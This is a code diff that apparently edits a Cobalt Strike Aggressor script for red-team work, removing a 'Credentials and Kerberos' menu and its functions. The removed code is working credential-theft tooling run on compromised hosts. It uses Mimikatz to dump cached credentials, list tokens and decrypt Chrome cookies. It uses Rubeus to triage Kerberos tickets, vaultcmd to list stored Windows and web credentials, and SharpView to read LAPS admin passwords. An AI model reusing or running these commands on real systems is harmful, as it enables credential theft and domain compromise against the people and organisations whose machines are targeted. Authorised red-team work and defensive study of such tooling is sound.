@@ -452,68 +452,6 @@ item "Service Enumeration - Remote Computer - T1046"{
 
 } #End Menu Popup
 
-#################################################
-
-#   Credentials and Kerberos
-
-#################################################
-menu "Credentials and Kerberos"
-{
-#List Cached Credentials
-item "List Cached Credentials (lsadump::cache)"{
-		local('$bid');
-				foreach $bid ($1){
-					lsadumpcache($bid);
-				}
-			}
-
-#Read LAPS Password
-item "Read LAPS Password"{
-        prompt_text("Computer Name", "", lambda({
-                    bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-DomainObject -Identity $1 -Properties ms-mcs-admpwd");                
-                }, $bids => $1));
-			}
-			
-#List Current Kerberos Tickets (rubeus triage)			
-item "List Current Kerberos Tickets (rubeus triage)"{
-			local('$bid');
-				foreach $bid ($1){
-					rubeustriage($bid);
-				}
-			}
-
-#List Tokens with MimiKatz
-item "List Tokens with Mimikatz"{
-			local('$bid');
-				foreach $bid ($1){
-					listtokens($bid);
-				}
-			}
-
-#Vaulted Windows Creds		
-item "Vaulted Windows Creds (vaultcmd)"{
-			local('$bid');
-				foreach $bid ($1){
-					windowsvaultcmd($bid);
-				}
-			}
-
-#Vaulted Web Creds			
-item "Vaulted Web Creds (vaultcmd)"{
-			local('$bid');
-				foreach $bid ($1){
-					webvaultcmd($bid);
-				}
-			}
-
-#Chrome Creds			
-item "Steal Chrome Creds (dpapi::chrome)"{
-			local('$bid');
-				foreach $bid ($1){
-					dpapichrome($bid);
-				}
-			}												
-}
 
 
 #################################################
@@ -898,44 +836,7 @@ bexecute_assembly($bids, script_resource('/exe/AtYourService.exe'), "$1");
 }, $bids => $1));
 }
 
-#################################################
 
-#   Credentials and Kerberos
-
-#################################################
-#List Cached Credentials
-sub lsadumpcache{
-bmimikatz($1, "lsadump::cache");
-}
-
-#Read LAPS Password
-
-			
-#List Current Kerberos Tickets (rubeus triage)			
-sub rubeustriage{
-bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "triage");
-}
-
-#List Tokens with MimiKatz
-sub listtokens{
-bmimikatz($1, "token::list");
-}
-
-#Vaulted Windows Creds		
-sub windowsvaultcmd{
-brun($1, 'vaultcmd.exe /listcreds:"Windows Credentials" /all');
-}
-
-#Vaulted Web Creds			
-#Steal Web Credentials from Vault
-sub webvaultcmd{
-brun($1, 'vaultcmd.exe /listcreds:"Web Credentials" /all');
-}
-
-#Chrome Creds			
-sub dpapichrome{
-bmimikatz($1, "dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies");
-}	
 
 #################################################
 
